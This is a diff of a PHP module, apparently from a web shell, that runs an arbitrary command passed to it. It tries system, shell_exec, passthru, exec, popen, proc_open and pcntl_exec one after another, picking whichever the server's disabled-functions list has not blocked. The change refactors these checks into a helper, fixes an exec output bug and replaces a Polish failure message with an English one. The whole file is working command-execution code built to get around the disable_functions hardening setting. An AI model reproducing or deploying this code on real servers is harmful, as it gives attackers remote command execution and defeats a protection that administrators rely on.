@@ -64,6 +64,11 @@ system - Uruchomienie polecenia systemowego
 DATA;
     }
 
+    protected function isFuncAvailable($sFunc)
+    {
+        return !in_array($sFunc, $this->oUtils->getDisabledFunctions());
+    }
+
     /**
      * Wywolanie modulu
      *
@@ -90,36 +95,36 @@ DATA;
         /**
          * system
          */
-        if (!in_array('system', $this->oUtils->getDisabledFunctions())) {
+        if ($this->isFuncAvailable('system')) {
             echo "system():\r\n\r\n";
             system($sCmd);
         }
         /**
          * shell_exec
          */
-        else if (!in_array('shell_exec', $this->oUtils->getDisabledFunctions())) {
+        else if ($this->isFuncAvailable('shell_exec')) {
             echo "shell_exec():\r\n\r\n";
             echo shell_exec($sCmd);
         }
         /**
          * passthru
          */
-        else if (!in_array('passthru', $this->oUtils->getDisabledFunctions())) {
+        else if ($this->isFuncAvailable('passthru')) {
             echo "passthru():\r\n\r\n";
             passthru($sCmd);
         }
         /**
          * exec
          */
-        else if (!in_array('exec', $this->oUtils->getDisabledFunctions())) {
+        else if ($this->isFuncAvailable('exec')) {
             echo "exec():\r\n\r\n";
             exec($sCmd, $aOutput);
-            echo implode("\r\n", $sLine) . "\r\n";
+            echo implode("\r\n", $aOutput) . "\r\n";
         }
         /**
          * popen
          */
-        else if (!in_array('popen', $this->oUtils->getDisabledFunctions())) {
+        else if ($this->isFuncAvailable('popen')) {
             echo "popen():\r\n\r\n";
             $rFp = popen($sCmd, 'r');
 
@@ -132,7 +137,7 @@ DATA;
         /**
          * proc_open
          */
-        else if (!in_array('proc_open', $this->oUtils->getDisabledFunctions())) {
+        else if ($this->isFuncAvailable('proc_open')) {
             echo "proc_open():\r\n\r\n";
             $rFp = proc_open($sCmd, array(
                     array('pipe', 'r'),
@@ -151,7 +156,9 @@ DATA;
         /**
          * pcntl_exec
          */
-        else if (function_exists('pcntl_exec') && !in_array('pcntl_exec', $this->oUtils->getDisabledFunctions())) {
+        else if (function_exists('pcntl_exec')
+            && $this->isFuncAvailable('pcntl_exec')
+        ) {
             echo "pcntl_exec():\r\n\r\n";
             $sPath = NULL;
             $aArgs = array();
@@ -163,7 +170,7 @@ DATA;
             }
             pcntl_exec($sPath, $aArgs);
         } else {
-            echo 'Wszystkie funkcje systemowe są poblokowane !!!';
+            return 'Cannot execute command. All functions have been blocked!';
         }
 
         $sData = "Command: '$sCmd'\r\nPHP function: " . ob_get_contents();
